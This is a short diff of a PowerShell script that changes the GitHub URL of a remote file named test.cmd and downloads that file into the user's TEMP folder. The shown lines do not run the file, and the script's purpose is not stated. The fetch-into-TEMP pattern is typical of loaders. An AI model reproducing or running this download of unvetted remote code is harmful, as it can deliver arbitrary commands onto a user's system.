@@ -1,6 +1,6 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-$cmdUrl = "https://github.com/nizhenets/test/raw/main/test.cmd"
+$cmdUrl = "https://github.com/nizhenets/Special_Script/raw/main/test.cmd"
 $tempPath = "$env:TEMP\test.cmd"
 
 Invoke-WebRequest -Uri $cmdUrl -OutFile $tempPath
